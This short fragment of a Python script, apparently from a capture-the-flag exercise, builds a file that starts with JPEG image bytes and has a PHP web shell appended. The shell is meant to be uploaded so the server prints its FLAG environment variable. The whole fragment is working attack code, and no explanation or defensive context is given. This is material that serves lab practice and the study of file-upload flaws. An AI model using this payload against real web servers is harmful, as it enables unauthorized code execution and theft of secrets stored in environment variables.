# Test 1: Upload shell that reads environment variables
print("[*] TEST 1: Upload shell to read FLAG environment variable")
shell_jpeg = jpeg_content + b'<?php echo "FLAG_START"; echo getenv("FLAG"); echo "FLAG_END"; ?>'
